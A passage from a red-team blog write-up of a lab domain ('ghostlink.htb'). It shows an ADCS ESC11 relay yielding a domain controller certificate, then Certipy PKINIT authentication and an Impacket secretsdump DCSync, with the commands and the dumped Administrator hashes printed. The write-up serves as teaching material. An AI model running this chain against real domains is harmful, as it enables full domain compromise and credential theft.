+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>RPC<span style="color:#f92672">)</span>: Authenticating connection from GHOSTLINK/DC01$@10.129.41.180 against rpc://172.16.20.10 SUCCEED
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> rpc://GHOSTLINK/DC01$@172.16.20.10 -&gt; Generating CSR...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> rpc://GHOSTLINK/DC01$@172.16.20.10 -&gt; CSR generated!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> rpc://GHOSTLINK/DC01$@172.16.20.10 -&gt; Getting certificate...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> rpc://GHOSTLINK/DC01$@172.16.20.10 -&gt; Successfully requested certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> rpc://GHOSTLINK/DC01$@172.16.20.10 -&gt; Request ID is <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> rpc://GHOSTLINK/DC01$@172.16.20.10 -&gt; Writing PKCS#12 certificate to ./DC01.pfx
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> rpc://GHOSTLINK/DC01$@172.16.20.10 -&gt; Certificate successfully written to file
+</span></span></code></pre></div><p>We now have <code>DC01.pfx</code> on disk.</p>
+<h2 id="phase-5-from-certificate-to-domain-admin">Phase 5: From Certificate to Domain Admin<a hidden class="anchor" aria-hidden="true" href="#phase-5-from-certificate-to-domain-admin">#</a></h2>
+<p>With the certificate (<code>DC01.pfx</code>) in hand, the next step is to obtain a TGT for the machine account and then perform a DCSync. However, when attempting to authenticate it is common to encounter the following error:</p>
+<p>The <strong><code>KRB_AP_ERR_SKEW (clock skew too great)</code></strong> error (code <code>0x1e</code>) indicates that the time difference between our attacker machine and the KDC (Domain Controller) exceeds the allowed limit (5 minutes by default).</p>
+<p>To fix it, we synchronize our attack machine&rsquo;s clock using <code>ntpdate</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo ntpdate 10.129.41.180
+</span></span></code></pre></div><p>There are several ways to resolve this time synchronization error. If you want to know more alternatives, I recommend checking out <a href="https://hackpuntes.com/es/posts/fixing-krb-ap-err-skew-kerberos-clock-skew/">this article</a>.</p>
+<p>With the clock synchronized, we run <strong>Certipy</strong> using the obtained certificate to request a TGT and retrieve the NT hash:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>➜  Ghostlink certipy auth -pfx DC01.pfx -dc-ip 10.129.41.180 -dns-tcp -ns 10.129.41.180 -domain ghostlink.htb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Certipy v5.1.0 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate identities:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     SAN DNS Host Name: <span style="color:#e6db74">&#39;dc01.ghostlink.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     Security Extension SID: <span style="color:#e6db74">&#39;S-1-5-21-3426459382-1936297842-2312468024-1000&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using principal: <span style="color:#e6db74">&#39;dc01$@ghostlink.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get TGT...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got TGT
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving credential cache to <span style="color:#e6db74">&#39;dc01.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote credential cache to <span style="color:#e6db74">&#39;dc01.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to retrieve NT hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;dc01$&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got hash: aad3b435b51404eeaad3b435b51404ee:7c02b790a7a6756...
+</span></span></code></pre></div><blockquote>
+<h3 id="what-happened-under-the-hood">What happened under the hood?<a hidden class="anchor" aria-hidden="true" href="#what-happened-under-the-hood">#</a></h3>
+<p>When presenting the certificate to the <strong>KDC (Key Distribution Center)</strong> via <strong>PKINIT</strong> (the Kerberos extension that enables certificate-based authentication):</p>
+<ol>
+<li><strong>Identity Validation:</strong> The KDC reads the <strong>SAN (Subject Alternative Name)</strong> field of the certificate, which points to <code>dc01.ghostlink.htb</code>.</li>
+<li><strong>TGT Issuance:</strong> Upon verifying that the certificate is legitimate and trusted, the KDC generates and delivers a <strong>TGT (Ticket Granting Ticket)</strong> for the machine account <code>DC01$</code>.</li>
+<li><strong>NT Hash Recovery:</strong> During this PKINIT exchange (specifically in the <em>AS-REP</em> response), <strong>Certipy</strong> decrypts the data structure and extracts the <strong>NT hash</strong> of the domain controller account.</li>
+</ol>
+</blockquote>
+<p>With the DC hash, we can execute DCSync. The <code>DC01$</code> account holds directory replication permissions (GetChanges, GetChangesAll), so it can request a copy of the NTDS.dit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>➜  Ghostlink secretsdump.py ghostlink.htb/dc01<span style="color:#ae81ff">\$</span>@dc01.ghostlink.htb -dc-ip 10.129.41.180 -hashes :82c9731fecb932a3f457f81768641f68 -just-dc-user administrator
+</span></span><span style="display:flex;"><span>Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:8190e067f478002ddd63eb209b016696:::
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Kerberos keys grabbed
+</span></span><span style="display:flex;"><span>Administrator:0x14:3291eeea0dfc6d311e1fc6f5ea0920b0cfee75d818a96b1fd5a70b3b6f28706d
+</span></span><span style="display:flex;"><span>Administrator:0x13:b82fd32fef344067a56681879e2d937e
+</span></span><span style="display:flex;"><span>Administrator:aes256-cts-hmac-sha1-96:b2e73d40a99d49f55a44a05a02fa898119d6f4de72c1eceb5d484c0679d92fd8
+</span></span><span style="display:flex;"><span>Administrator:aes128-cts-hmac-sha1-96:c3607a0efea3207eb5b1df36eb2dd256
+</span></span><span style="display:flex;"><span>Administrator:0x17:8190e067f478002ddd63eb209b016696
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up...
+</span></span></code></pre></div><p><img alt="DCSync complete — domain fully compromised" loading="lazy" src="/assets/img/ESC11_Ghostlink/end.png"></p>
+<hr>
+<p>Thanks for reading — I hope this is useful. If you have any questions, suggestions, corrections, or simply want to share something about this topic, my socials are on this blog — feel free to reach out.</p>
+<p>Closing quote:</p>
+<blockquote>
+<p>&ldquo;I have no special talents. I am only passionately curious.&rdquo;</p>
+<p>— Albert Einstein</p>
+</blockquote>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="//localhost:1313/tags/adcs/">ADCS</a></li>
+      <li><a href="//localhost:1313/tags/esc11/">ESC11</a></li>
+      <li><a href="//localhost:1313/tags/ntlm-relay/">NTLM Relay</a></li>
+      <li><a href="//localhost:1313/tags/rpc-relay/">RPC Relay</a></li>
+      <li><a href="//localhost:1313/tags/active-directory/">Active Directory</a></li>
+      <li><a href="//localhost:1313/tags/red-team/">Red Team</a></li>
+      <li><a href="//localhost:1313/tags/privilege-escalation/">Privilege Escalation</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="//localhost:1313/">IamWin&#39;s Blog</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a><script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+
+    
+    if (typeof mediumZoom === 'function') {
+      mediumZoom('.post-content img', {
+        background: 'rgba(0, 0, 0, 0.8)',
+        margin: 24
+      });
+    }
+
+    
+    
+    
+
+    const tocInner = document.querySelector('.toc .inner');
+    if (!tocInner) return;
+
+    const headings = Array.from(
+      document.querySelectorAll('.post-content h2, .post-content h3, .post-content h4')
+    );
+    if (headings.length === 0) return;
+
+    
+    const topItems = Array.from(tocInner.querySelectorAll(':scope > ul > li'));
+
+    
+    topItems.forEach(item => {
+      const sub = item.querySelector(':scope > ul');
+      if (sub) sub.style.display = 'none';
+    });
+
+    
+    function getActiveHeading() {
+      const scrollPos = window.scrollY + 150;
+      let active = headings[0];
+      for (const h of headings) {
+        if (h.getBoundingClientRect().top + window.scrollY <= scrollPos) {
+          active = h;
+        } else {
+          break;
+        }
+      }
+      return active;
+    }
+
+    function getParentH2(heading) {
+      if (heading.tagName === 'H2') return heading;
+      const idx = headings.indexOf(heading);
+      for (let i = idx - 1; i >= 0; i--) {
+        if (headings[i].tagName === 'H2') return headings[i];
+      }
+      return null;
+    }
+
+    
+    function updateTOC() {
+      const active   = getActiveHeading();
+      const activeH2 = getParentH2(active);
+
+      topItems.forEach(item => {
+        const h2Link = item.querySelector(':scope > a');
+        const sub    = item.querySelector(':scope > ul');
+        if (!h2Link) return;
+
+        const h2Id = decodeURIComponent(h2Link.getAttribute('href').replace(/^#/, ''));
+        const isCurrentSection = activeH2 && activeH2.id === h2Id;
+
+        
+        if (sub) sub.style.display = isCurrentSection ? '' : 'none';
+
+        
+        h2Link.classList.toggle('active', isCurrentSection);
+
+        
+        if (sub) {
+          sub.querySelectorAll('a').forEach(link => {
+            const id = decodeURIComponent(link.getAttribute('href').replace(/^#/, ''));
+            link.classList.toggle('active', active.id === id);
+          });
+        }
+      });
+    }
+
+    window.addEventListener('scroll', updateTOC, { passive: true });
+    updateTOC();
+  });
+</script>
+
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
